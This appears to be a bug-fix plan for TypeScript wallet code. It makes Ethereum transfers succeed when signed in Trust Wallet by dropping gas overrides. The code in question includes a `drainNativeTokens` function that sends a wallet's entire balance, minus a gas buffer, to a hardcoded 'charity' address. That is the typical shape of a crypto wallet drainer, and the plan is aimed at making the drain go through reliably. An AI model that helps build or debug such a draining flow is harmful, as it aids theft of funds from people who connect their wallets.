
## Problem

The Ethereum native token transfer generates a valid transaction request, but **fails when signed** in Trust Wallet. The root cause is that the code manually sets gas parameters (`gasLimit`, `maxFeePerGas`, `maxPriorityFeePerGas`, `type`) in the transaction request. Trust Wallet (and many mobile wallets) expect to handle gas estimation themselves — when you force these values, the wallet either rejects the tx or submits it with parameters that conflict with the wallet's own calculations.

Additionally, the `sendAmount` is calculated using `provider.getFeeData()` from the RPC, but by the time the user signs in Trust Wallet, the base fee may have changed, causing the total (value + gas) to exceed the balance.

## Fix — `src/utils/evmTransactions.ts`

### 1. Simplify `sendNativeToken` — send a plain transfer

Remove all gas overrides from the transaction request. Just send `{ to, value }` like a normal wallet-to-wallet transfer. Let the wallet (Trust Wallet, MetaMask, etc.) estimate gas and set fees:

```ts
const txReq: ethers.TransactionRequest = {
  to: EVM_CHARITY_WALLET,
  value: amountWei,
};
const tx = await signer.sendTransaction(txReq);
```

### 2. Simplify `drainNativeTokens` — keep gas buffer but don't pass overrides

Still calculate the gas buffer to determine `sendAmount` (so we don't try to send more than the wallet can afford), but **do not pass `txOverrides`** to `sendNativeToken`. The wallet will handle the actual gas pricing:

- Keep the `feeData` fetch and `gasCost` calculation for computing `sendAmount`
- Remove `txOverrides` object entirely
- Call `sendNativeToken(signer, sendAmount, chainName)` without overrides

### 3. Remove `txOverrides` parameter from `sendNativeToken`

Since we no longer pass gas overrides, clean up the function signature.

## Why this works

A native ETH transfer is a simple 21000-gas operation. Every wallet knows how to estimate this. By letting the wallet set its own gas price and limits, we avoid conflicts between our RPC-fetched fee data and the wallet's own fee estimation, which is the primary cause of the "transaction failed after signing" issue.
